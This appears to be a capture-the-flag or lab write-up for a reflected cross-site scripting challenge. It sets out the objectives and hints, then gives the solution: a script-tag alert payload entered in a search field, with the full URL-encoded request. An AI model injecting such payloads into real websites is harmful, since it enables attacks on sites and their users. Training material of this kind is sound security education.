# Challenge #1 - Poema Reading club 2

## Objectives

- Since XSS is an input validation attack, you should first determine which pages accept user input. Not all of these are subject to XSS, but it is a good subset to begin with.
- Then, try to insert HTML tags as probes to verify if any XSS is present. Make sure to understand what kind of code you can inject, if HTML or also JavaScript.

## Hints

- XSS Reflected

## What you will learn

- How to find basic XSS
- How XSS an affect a web page
- How to make the most basic exploitation of an XSS vulnerability

## Steps

Just add the payload on the search field.

Payload: <script>alert(document.domain)</script>

```
http://1.challenge.xss.site/search.php?term=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```